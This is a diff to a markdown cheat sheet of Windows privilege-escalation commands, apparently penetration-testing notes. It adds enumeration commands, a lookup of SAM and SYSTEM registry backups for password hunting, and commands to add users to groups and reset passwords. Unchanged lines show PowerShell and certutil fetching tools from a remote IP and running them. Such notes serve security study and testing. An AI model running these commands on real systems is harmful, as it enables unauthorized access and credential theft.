@@ -5,6 +5,31 @@
 ##################################################################
 -->
 
+## Initial Windows Enumeration
+
+#### Get System Info look for Juicy Potato
+
+`systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"`
+
+#### Get User Privileges
+
+`whoami /priv`
+
+#### Show Ports and Connections
+
+`netstat –nao`
+
+#### Look for Passwords
+
+`dir C:\Windows\System32\config\RegBack\SAM`
+
+`dir C:\Windows\System32\config\RegBack\SYSTEM`
+
+<!--
+##################################################################
+##################################################################
+-->
+
 ## Privesc tools
 
 ### Download to Target Box
@@ -121,7 +146,7 @@ c:\unattend.xml
 
 #### List users in a group
 
-`net localgroup administrator`
+`net localgroup administrators`
 
 #### Show info on specified user
 
@@ -246,6 +271,10 @@ Oneliner method to extract wifi passwords from all the access point.
 
 `IEX(New-Object Net.WebClient).downloadString('http://10.9.3.23/PowerUp.ps1')`
 
+#### Send GET requests using Powershell
+
+`$Resp = Invoke-WebRequest 'http://targeturl' -UseBasicParsing`
+
 #### Use certutil to download from web
 
 `certutil.exe -urlcache -split -f "http://10.9.3.23/Advanced.exe" Advanced.exe`
@@ -320,3 +349,11 @@ Start
 #### Check File Hash
 
 `CertUtil -hashfile <path to file> MD5`
+
+#### Add user to local group
+
+`net localgroup group_name UserLoginName /add
+
+#### Change local users password
+
+`net user loginid newpassword`
